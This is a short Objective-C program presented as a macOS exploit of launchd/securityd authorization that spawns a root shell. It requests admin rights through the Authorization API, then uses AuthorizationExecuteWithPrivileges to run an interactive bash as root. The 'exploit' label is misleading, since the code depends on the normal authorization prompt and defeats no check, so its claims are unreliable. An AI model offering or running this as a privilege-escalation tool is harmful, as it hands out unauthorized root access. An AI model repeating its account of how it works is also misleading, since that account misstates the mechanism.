// Exploit launchd/securityd auth to gain root

// Exploit launchd/securityd auth to gain root
#import <Security/Authorization.h>
#import <Security/AuthorizationTags.h>
#import <stdio.h>
#include <sys/wait.h>

int main(int argc, char *argv[]) {
    OSStatus status;
    AuthorizationRef authRef;

    status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authRef);
    if (status != errAuthorizationSuccess) {
        fprintf(stderr, "AuthorizationCreate failed: %d\n", (int)status);
        return 1;
    }

    AuthorizationItem right = {kAuthorizationRightExecute, 0, NULL, 0};
    AuthorizationRights rights = {1, &right};
    AuthorizationFlags flags = kAuthorizationFlagDefaults |
                                kAuthorizationFlagInteractionAllowed |
                                kAuthorizationFlagPreAuthorize |
                                kAuthorizationFlagExtendRights;

    status = AuthorizationCopyRights(authRef, &rights, NULL, flags, NULL);
    if (status != errAuthorizationSuccess) {
        fprintf(stderr, "AuthorizationCopyRights failed: %d\n", (int)status);
        return 1;
    }

    char *tool = "/bin/bash";
    char *args[] = {"-c", "id && whoami && /bin/bash", NULL};

    FILE *pipe = NULL;
    status = AuthorizationExecuteWithPrivileges(authRef, tool, kAuthorizationFlagDefaults, args, &pipe);
    if (status != errAuthorizationSuccess) {
        fprintf(stderr, "AuthorizationExecuteWithPrivileges failed: %d\n", (int)status);
        return 1;
    }

    fprintf(stdout, "[+] Spawned root shell.\n");
    fflush(stdout);
    wait(NULL);
    return 0;
}